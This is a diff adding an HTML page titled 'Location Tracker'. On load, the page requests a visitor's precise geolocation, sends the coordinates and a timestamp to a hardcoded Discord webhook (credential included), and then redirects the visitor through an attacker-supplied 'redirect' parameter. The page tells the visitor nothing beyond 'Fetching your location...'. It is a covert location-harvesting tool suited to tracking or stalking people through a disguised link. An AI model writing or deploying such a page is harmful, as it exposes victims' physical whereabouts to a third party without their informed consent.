@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Location Tracker</title>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, redirectWithoutLocation, { enableHighAccuracy: true });
+            } else {
+                redirectWithoutLocation();
+            }
+        }
+
+        function sendLocation(position) {
+            let lat = position.coords.latitude;
+            let lon = position.coords.longitude;
+            let accuracy = position.coords.accuracy;
+            let timestamp = new Date().toISOString();
+            let redirectUrl = new URLSearchParams(window.location.search).get("redirect") || "https://defaultsite.com";
+            let webhookUrl = "https://discord.com/api/webhooks/1357393737864445992/SRNYrjE7Gfmpmqhq0sb8SqpLYdGDwN2h4d5OOeBnIm5E3wsEknuY51eCUKbdHdGz_lmo";
+
+            let locationData = {
+                content: `New Location Logged:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy} meters\nTimestamp: ${timestamp}`
+            };
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(locationData)
+            }).then(response => response.text()).then(result => {
+                console.log("Location sent to Discord: ", result);
+            }).catch(error => {
+                console.error("Error sending to Discord: ", error);
+            }).finally(() => {
+                window.location.href = redirectUrl;
+            });
+        }
+
+        function redirectWithoutLocation() {
+            let redirectUrl = new URLSearchParams(window.location.search).get("redirect") || "https://defaultsite.com";
+            window.location.href = redirectUrl;
+        }
+    </script>
+</head>
+<body onload="getLocation()">
+    <p>Fetching your location...</p>
+</body>
+</html>
